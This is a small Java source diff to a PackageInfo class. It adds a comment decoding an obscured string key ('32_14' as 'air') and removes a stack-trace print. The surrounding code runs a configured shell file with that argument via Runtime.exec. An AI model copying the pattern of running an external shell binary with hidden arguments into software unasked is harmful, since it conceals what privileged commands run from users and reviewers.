@@ -137,6 +137,7 @@ public class PackageInfo {
 			final AutoFile file = new AutoFile(Configuration.shellFile);
 
 			if (file.exists() && file.canRead()) {
+				// 32_14= air
 				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + Messages.getString("32_14"));
 				p.waitFor();
 
@@ -154,7 +155,6 @@ public class PackageInfo {
 			}
 
 			if (Cfg.DEBUG) {
-				e.printStackTrace();
 				Check.log(e);//$NON-NLS-1$
 			}
 		}
